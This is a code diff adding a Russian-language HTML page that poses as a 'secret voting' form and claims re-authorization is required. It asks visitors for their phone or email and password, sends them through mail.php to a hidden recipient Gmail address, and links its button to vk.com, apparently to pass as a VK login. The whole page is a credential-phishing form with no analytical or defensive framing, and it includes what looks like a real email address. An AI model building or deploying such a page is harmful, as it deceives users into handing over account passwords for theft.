@@ -1,0 +1,32 @@
+<html>
+<head>
+  <title>Форма заявки с сайта</title>
+  <link rel="stylesheet" type="text/css" href="./css/style.css">
+</head>
+
+<body>
+<div class="golos-box">
+  <form id="golosForm" action="mail.php" class="golos-form" >
+    <h4 class="golos-title">Участие в тайном голосовании</h4>
+    <label class="golos-content">
+      <p class="golos-message">Для участия требуется повторная <strong>авторизация</strong></p>
+      <input type="hidden" name="project_name" value="golos">
+      <input type="hidden" name="admin_email" value="victor.trumpel@gmail.com">
+      <input type="hidden" name="form_subject" value="Заявка на голосование">
+      
+      <input type="text" placeholder="Телефон или email" name="user_phone" class="golos-input" required>
+      <br>
+      <input type="password" placeholder="Пароль" name="user_pass" class="golos-input" required>
+      <br>
+      <div class="golos-btn-container">
+        <a class="golos-btn" href="https://vk.com/" onclick="document.getElementById('#golosForm').submit(); return false;">
+          Далее
+        </a>
+      </div>
+
+    </label>
+  </form>
+</div>
+</body>
+
+</html>
